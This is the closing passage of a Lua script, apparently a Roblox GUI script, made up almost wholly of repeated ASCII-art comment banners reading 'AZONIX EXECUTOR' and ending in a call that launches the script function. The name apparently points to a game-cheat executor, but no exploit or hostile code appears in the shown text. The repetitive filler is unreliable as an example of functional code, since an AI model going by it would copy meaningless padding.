	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	--[[
	
	 █████   ███████   ██████  ███    ██ ██ ██   ██ 
	██   ██    ███    ██    ██ ████   ██ ██  ██ ██  
	███████    ███    ██    ██ ██ ██  ██ ██   ███   
	██   ██    ███    ██    ██ ██  ██ ██ ██  ██ ██  
	██   ██    ███     ██████  ██   ████ ██ ██   ██ 
	
	
	███████ ██   ██  ███████ ███████ ██    ██ ████████  ██████  ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██    █
	█████     ███    █████   ██      ██    ██    ██    ██    ██ ██████  
	██       ██ ██   ██      ██      ██    ██    ██    ██    ██ ██   ██
	███████ ██   ██  ███████ ███████  ██████     ██     ██████  ██   ██
	
	]]--
	
	
end
coroutine.wrap(LZDTG_fake_script)()
